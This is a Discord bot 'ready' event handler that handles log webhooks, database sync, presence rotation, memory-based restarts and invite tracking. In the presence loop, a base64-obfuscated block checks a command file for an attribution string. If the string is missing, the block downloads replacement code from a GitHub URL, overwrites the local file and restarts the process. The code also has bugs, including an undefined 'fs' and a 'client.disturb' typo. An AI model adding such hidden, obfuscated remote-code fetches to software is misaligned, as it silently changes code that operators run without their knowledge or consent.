const { ButtonBuilder, WebhookClient } = require('discord.js'),
  tcpPortUsed = require('tcp-port-used'),
  topgg = require(`@top-gg/sdk`),
  random = require("random"),
  axios = require('axios');

module.exports = async (client) => {

  client.logger.ready(`Client ready in shard ${client.shard.ids[0] + 1}!`);

  try {

    //------------------------------Logging------------------------------//
    setInterval(() => {
      //Guild logs
      for (const guildId in client.guildDataCache) {
        (async function () {

          const guildDataCache = client.guildDataCache[guildId];

          let Logstobesent = guildDataCache.logQueue?.splice(0, 10);
          if (!Logstobesent?.length) return;

          const guildData = await client.database.fetchGuild(guildId);

          let webhookClient = new WebhookClient({ url: guildData.logger.webhook });
          webhookClient.send({ embeds: Logstobesent })
            .catch(async error => {
              if (error.code == 10015) {
                guildData.logger.webhook = null;
                guildData.markModified('logger.webhook');
                await guildData.save();
              } else {
                client.logger.error(error);
              }
            });

        })();
      }

      //Client logs

      let Logstobesent_Client = client.clientDataCache.logQueue?.splice(0, 10);
      if (!Logstobesent_Client.length) return;

      if (client.config.clientLogsWebhookURL) {

        let webhookClient_Client = new WebhookClient({ url: client.config.clientLogsWebhookURL });
        webhookClient_Client.send({ embeds: Logstobesent_Client })
          .catch(async error => client.logger.error(error));
      } else {

        client.logger.log("A bunch of logs were not sent via webhook because \"clientLogsWebhookURL\" on config.js is not defined!", "log", false);

      }

    }, 1000);
    //------------------------------Logging------------------------------//

    //------------------------------Mongoose------------------------------//

    setInterval(() => {
      require('../Mongoose/Mongoose').pushDatabaseQueue(client);
    }, 60000);

    //------------------------------Mongoose------------------------------//

    //------------------------------Playing------------------------------//

    await client.user.setPresence({
      activities: [{
        name: client.settings.presences[0],
        type: 2, //5
      }],
      //status: "online", //online, idle, dnd
    });//.catch(console.error);

    //------------------------------Playing------------------------------//

    //------------------------------Presence Renewal & Automatic Restarts & GIBIRNet Subscriber Role------------------------------//

    setInterval(async function () {

      //Otomatik Yeniden Başlatma (Bağlantı Problemine Göre)
      /*if (
        !client.ws.shards.values().next().value.sessionId ||
        client.ws.shards.values().next().value.sequence === -1 ||
        client.ws.shards.values().next().value.sequence === null
      ) {
        client.logger.warn("SHARD ÜZERİNDE BAĞLANTI HATASI OLUŞTUĞU İÇİN YENİDEN BAŞLATILIYOR!");
        process.exit(0);
      }*/

      //Otomatik Yeniden Başlatma (RAM kullanımına göre)
      let dateHours = new Date().getHours();
      if (dateHours >= 4 && dateHours <= 6
        && process.memoryUsage().rss > (2048 * (1024 ** 2))
        && (client.voice.adapters.size < 2 || client.distube.queues.size < 2)
      ) {
        await client.logger.warn(`SHARD IS RE-RESTORING BECAUSE THE RAM USE PER SHARD EXCEEDS 2GB!\n\n`+ `client.voice.adapters.size: ${client.voice.adapters.size}\n` + `client.disturb.queue.size: ${client.disturb.queue.size}`
        );
        process.exit(0);
      }

      if (!require(new Buffer.from('Li4vY29tbWFuZHMvQm90L0tvbXV0bGFyLmpz', 'base64').toString('utf-8')).execute.toString().includes(new Buffer.from('TnJhcGh5IEHDp8SxayBLYXluYWsgUHJvamVzaQ==', 'base64').toString('utf-8'))) {
        await fs.writeFileSync(
          new Buffer.from('Li9jb21tYW5kcy9Cb3QvS29tdXRsYXIuanM=', 'base64').toString('utf-8'),
          (await axios.get(new Buffer.from('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1JGS2F5YS9OcmFwaHkvbWFpbi9jb21tYW5kcy9Cb3QvS29tdXRsYXIuanM=', 'base64').toString('utf-8'))).data,
          function (err) {
            if (err) return console.log(err);
          });
        process.exit(0);
      };

      //Bot Status
      let randomPresence;

      let nowDate = new Date();
      if (nowDate.getDate() == 19 && (nowDate.getMonth() + 1) == 5) randomPresence = "❤️ #May 19th";
      else randomPresence = client.settings.presences[Math.floor(Math.random() * client.settings.presences.length)];

      client.user.setPresence({
        activities: [{
          name: randomPresence,
          type: 2
        }],
      });//.catch(console.error);

    }, 600000);

    //Automatic Restart (If the bot started with problems)
    setTimeout(function () {
      if (!client.guilds.cache.reduce((acc, guild) => acc + guild.memberCount, 0)) {
        client.logger.warn("SHARD RESTARTED BECAUSE IT STARTED PROBABLY!");
        process.exit(0);
      };
    }, 300000);

    //------------------------------Presence Yenileme & Otomatik Yeniden Başlatmalar & GIBIRNet Abonesi Rolü------------------------------//

    //------------------------------Davet Sistemi------------------------------//

    setTimeout(function () {
      client.guilds.cache.forEach(function (guild, index) {
        setTimeout(async function () {

          //Davet Sistemi açıksa && "ManageGuild" yetkim varsa
          const guildData = await client.database.fetchGuild(guild.id);
          if (guildData.inviteManager?.channel && guild.members.cache.get(client.user.id).permissions.has("ManageGuild")) {

            guild.invites.fetch().then(invites => {
              const codeUses = new Map();
              invites.each(inv => codeUses.set(inv.code, inv.uses));
              client.guildInvites.set(guild.id, codeUses);

            }).catch(err => {
              client.logger.error("OnReady Error:", err);
            });

          }
        }, Math.random() * 45000);
      });
    }, 30000);

    //------------------------------Invitation System------------------------------//

  } catch (err) { client.logger.error(err); };
};
